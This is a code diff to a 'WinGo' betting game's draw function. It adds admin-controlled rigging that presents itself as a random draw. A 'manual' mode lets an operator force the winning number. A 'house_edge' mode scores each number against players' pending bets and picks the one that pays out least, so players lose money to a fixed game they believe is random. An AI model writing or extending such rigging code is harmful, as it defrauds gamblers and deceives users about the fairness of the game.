@@ -190,13 +190,49 @@ class WinGoGame {
         }
     }
 
-    drawPeriodResult() {
-        const resultNumber = Math.floor(Math.random() * 10);
+    async drawPeriodResult() {
+        const periodForDraw = this.currentPeriod;
+        let resultNumber = Math.floor(Math.random() * 10);
+
+        // Fetch Admin 1-Click Manual Force / House-Edge rigging settings live!
+        try {
+            const res = await fetch('/api/game/all-rigging', { cache: 'no-store' });
+            const rig = await res.json();
+            if (rig.success) {
+                if (rig.wingo_mode === 'manual' && rig.wingo_manual_number !== '' && !isNaN(parseInt(rig.wingo_manual_number, 10))) {
+                    resultNumber = Math.max(0, Math.min(9, parseInt(rig.wingo_manual_number, 10)));
+                } else if (rig.wingo_mode === 'house_edge') {
+                    // Pick number 0-9 with lowest payout against pending bets for this period
+                    const activeBets = this.userBets.filter(b => b.period === periodForDraw && b.status === 'Pending');
+                    if (activeBets.length > 0) {
+                        let bestNum = resultNumber;
+                        let minPay = Infinity;
+                        for (let n = 0; n <= 9; n++) {
+                            const c = this.getColorForNumber(n);
+                            const sz = n >= 5 ? 'big' : 'small';
+                            let pay = 0;
+                            for (const b of activeBets) {
+                                if (b.selectType === 'number' && parseInt(b.selectValue) === n) pay += b.totalBet * 9;
+                                else if (b.selectType === 'size' && b.selectValue === sz) pay += b.totalBet * 2;
+                                else if (b.selectType === 'color') {
+                                    if (b.selectValue === 'green' && (c === 'green' || c === 'green-violet')) pay += b.totalBet * (c === 'green' ? 2 : 1.5);
+                                    if (b.selectValue === 'red' && (c === 'red' || c === 'red-violet')) pay += b.totalBet * (c === 'red' ? 2 : 1.5);
+                                    if (b.selectValue === 'violet' && (n === 0 || n === 5)) pay += b.totalBet * 4.5;
+                                }
+                            }
+                            if (pay < minPay) { minPay = pay; bestNum = n; }
+                        }
+                        resultNumber = bestNum;
+                    }
+                }
+            }
+        } catch (e) {}
+
         const color = this.getColorForNumber(resultNumber);
         const size = resultNumber >= 5 ? 'Big' : 'Small';
 
         const record = {
-            period: this.currentPeriod,
+            period: periodForDraw,
             number: resultNumber,
             color: color,
             size: size
